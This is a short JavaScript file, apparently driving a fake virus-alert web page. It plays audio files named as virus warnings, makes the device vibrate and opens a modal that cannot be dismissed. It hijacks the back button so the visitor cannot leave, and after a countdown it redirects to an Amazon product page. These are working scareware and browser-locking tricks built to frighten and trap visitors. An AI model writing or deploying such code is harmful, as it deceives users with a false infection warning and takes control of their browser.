function play_se(){
    var warning = new Audio('virusm.mp3');
    var voice = new Audio('virusn.mp3');
    warning.play();
    voice.play();
    navigator.vibrate([200, 100, 200, 100, 200, 100, 200, 100, 200, 100,])
}


$(function(){
    
    
    history.pushState(null, null, location.href);
    window.addEventListener('popstate', (e) => {
    play_se();
    history.go(1);
    });
    
    
    $('.modal').modal({dismissible: false});
    $('#alert').modal('open');
    $('#close').click(function(){
        $('#alert').modal('close');
        play_se();
    });
    
    
    var time = 9;
    setInterval(function(){
    time--;
    if (time <= 0) window.location = "https://www.amazon.co.jp/dp/B007QAVY7U/ref=cm_sw_r_cp_ep_dp_HR5gBbDQYFETV"
    $('#timer').text(time);    
    }, 1000);
});